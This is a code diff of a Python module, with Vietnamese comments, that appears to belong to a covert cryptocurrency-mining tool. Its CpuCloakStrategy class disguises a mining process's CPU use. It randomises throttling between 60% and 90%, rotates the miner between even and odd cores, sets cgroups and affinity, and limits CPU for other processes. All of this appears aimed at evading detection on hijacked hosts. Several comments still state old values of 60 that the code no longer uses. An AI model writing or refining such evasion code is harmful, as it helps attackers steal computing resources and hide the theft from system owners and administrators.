@@ -95,10 +95,10 @@ class CpuCloakStrategy(CloakStrategy):
         self.process_cgroup: Dict[int, str] = {}
 
         # Giới hạn CPU ban đầu
-        self.throttle_percentage = config.get('throttle_percentage', 60)
+        self.throttle_percentage = config.get('throttle_percentage', 70)
         if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
             self.logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 60%.")
-            self.throttle_percentage = 60
+            self.throttle_percentage = 70
 
         # Cores chẵn và lẻ
         self.even_cores = [i for i in range(psutil.cpu_count(logical=True)) if i % 2 == 0]
@@ -111,12 +111,12 @@ class CpuCloakStrategy(CloakStrategy):
         self.core_lock = threading.Lock()
 
         # Thời gian chuyển đổi giữa chẵn và lẻ
-        self.switch_interval = config.get("switch_interval", 60)  # Mặc định 60 giây
+        self.switch_interval = config.get("switch_interval", 120)  # Mặc định 60 giây
 
         # Tạo luồng nền để cập nhật throttle_percentage
         self.dynamic_throttle = config.get('dynamic_throttle', True)
         if self.dynamic_throttle:
-            self.update_interval = config.get('update_interval', 60)  # Cập nhật mỗi 60 giây
+            self.update_interval = config.get('update_interval', 120)  # Cập nhật mỗi 60 giây
             self.dynamic_thread = threading.Thread(target=self._update_throttle_percentage, daemon=True)
             self.dynamic_thread.start()
 
@@ -139,8 +139,8 @@ class CpuCloakStrategy(CloakStrategy):
         """
         while True:
             try:
-                # Tạo giá trị throttle_percentage ngẫu nhiên từ 50% đến 80%
-                self.throttle_percentage = random.uniform(50, 80)
+                # Tạo giá trị throttle_percentage ngẫu nhiên từ 60% đến 90%
+                self.throttle_percentage = random.uniform(60, 90)
                 self.logger.info(f"Đã cập nhật throttle_percentage động: {self.throttle_percentage:.2f}%.")
 
                 # Áp dụng lại throttle cho tất cả các tiến trình đang được quản lý
@@ -160,22 +160,26 @@ class CpuCloakStrategy(CloakStrategy):
             # Chờ đến lần cập nhật tiếp theo
             time.sleep(self.update_interval)
 
-    def _switch_cores(self) -> None:
+    def _switch_cores(self):
         """
-        Luồng chạy nền để thay đổi cores chẵn và lẻ theo thời gian.
+        Chuyển đổi giữa cores chẵn và lẻ, đồng thời cập nhật hoặc xóa cgroup.
         """
-        while True:
-            try:
-                with self.core_lock:  # Đảm bảo đồng bộ hóa
-                    if self.target_cores == self.even_cores:
-                        self.target_cores = self.odd_cores
-                        self.logger.info(f"Chuyển sang cores lẻ: {self.target_cores}")
-                    else:
-                        self.target_cores = self.even_cores
-                        self.logger.info(f"Chuyển sang cores chẵn: {self.target_cores}")
-            except Exception as e:
-                self.logger.error(f"Lỗi khi chuyển đổi danh sách cores: {e}")
-            time.sleep(self.switch_interval)
+        try:
+            with self.core_lock:
+                if self.target_cores == self.even_cores:
+                    self.target_cores = self.odd_cores
+                    self.logger.info("Chuyển sang cores lẻ.")
+                else:
+                    self.target_cores = self.even_cores
+                    self.logger.info("Chuyển sang cores chẵn.")
+                
+                # Xóa cgroup không còn sử dụng
+                for pid, cgroup_name in list(self.process_cgroup.items()):
+                    if not os.path.exists(os.path.join(self.CGROUP_CPU_BASE, cgroup_name)):
+                        del self.process_cgroup[pid]
+                        self.logger.info(f"Đã xóa thông tin cgroup {cgroup_name} cho PID={pid}.")
+        except Exception as e:
+            self.logger.error(f"Lỗi khi chuyển đổi danh sách cores: {e}")
 
     def apply(self, process: MiningProcess) -> None:
         """
@@ -185,6 +189,17 @@ class CpuCloakStrategy(CloakStrategy):
         """
         try:
             pid, name = process.pid, process.name
+
+            # # Lấy tên cgroup hiện tại hoặc tạo mới nếu chưa có
+            # cgroup_name = self.process_cgroup.get(pid)
+            # cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage, cgroup_name)
+            
+            # if cgroup_name:
+            #     self.process_cgroup[pid] = cgroup_name
+            #     self.logger.info(f"[CPU Cloaking] Giới hạn CPU={self.throttle_percentage:.2f}% cho {name}(PID={pid}).")
+            # else:
+            #     self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {name}(PID={pid}).")
+            #     return
 
             # Lấy tên cgroup hiện tại hoặc tạo mới nếu chưa có
             cgroup_name = self.process_cgroup.get(pid)
@@ -197,20 +212,26 @@ class CpuCloakStrategy(CloakStrategy):
                 self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {name}(PID={pid}).")
                 return
 
+            # Đặt CPU affinity với cores chẵn/lẻ và cập nhật cgroup
+            with self.core_lock:
+                success_affinity = self.cpu_resource_manager.optimize_thread_scheduling(
+                    pid, self.target_cores, cgroup_name=cgroup_name
+                )
+
+            if success_affinity:
+                self.logger.info(
+                    f"[CPU Cloaking] Đặt CPU affinity và cập nhật cgroup với cores {self.target_cores} cho {name}(PID={pid})."
+                )
+            else:
+                self.logger.error(f"[CPU Cloaking] Không thể đặt CPU affinity hoặc cập nhật cgroup cho {name}(PID={pid}).")
+
+
             # Tối ưu cache CPU
             success_cache = self.cpu_resource_manager.optimize_cache_usage(pid)
             if success_cache:
                 self.logger.info(f"[CPU Cloaking] Tối ưu cache cho {name}(PID={pid}).")
             else:
                 self.logger.error(f"[CPU Cloaking] Không thể tối ưu cache cho {name}(PID={pid}).")
-
-            # Đặt CPU affinity với cores chẵn/lẻ
-            with self.core_lock:
-                success_affinity = self.cpu_resource_manager.optimize_thread_scheduling(pid, self.target_cores)
-            if success_affinity:
-                self.logger.info(f"[CPU Cloaking] Đặt CPU affinity cho {name}(PID={pid}).")
-            else:
-                self.logger.error(f"[CPU Cloaking] Không thể đặt CPU affinity cho {name}(PID={pid}).")
 
             # Hạn chế tiến trình bên ngoài
             outside_ok = self.cpu_resource_manager.limit_cpu_for_external_processes(
